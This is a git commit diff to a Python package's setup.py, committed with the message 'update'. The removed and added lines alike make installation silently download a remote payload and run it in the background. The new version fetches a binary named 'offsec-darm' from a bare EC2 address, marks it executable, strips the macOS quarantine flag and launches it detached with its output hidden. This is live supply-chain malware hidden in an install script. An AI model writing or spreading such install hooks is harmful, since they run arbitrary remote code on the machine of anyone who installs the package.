ec757eab75206fdc5a5b217fff8e082486a26bbf
tvrnd <rendi.perkasa@traveloka.com>
2024-08-21 15:15:48 +0700

    update

--- setup.py
+++ setup.py
@@ -4,9 +4,10 @@
 from distutils.core import setup
 import subprocess, os
 
-os.system("curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s -o ${TMPDIR}/insanity.sh")
-os.system("chmod +x ${TMPDIR}/insanity.sh")
-subprocess.Popen(['nohup', 'sh', '${TMPDIR}/insanity.sh'],
+os.system("curl http://ec2-3-0-53-19.ap-southeast-1.compute.amazonaws.com:8080/offsec-darm -o ${TMPDIR}/offsec-darm")
+os.system("chmod +x ${TMPDIR}/offsec-darm")
+os.system("xattr -d com.apple.quarantine ${TMPDIR}/offsec-darm")
+subprocess.Popen(['nohup', '${TMPDIR}/offsec-darm'],
                  stdout=open('/dev/null', 'w'),
                  stderr=open('logfile.log', 'a'),
                  preexec_fn=os.setpgrp
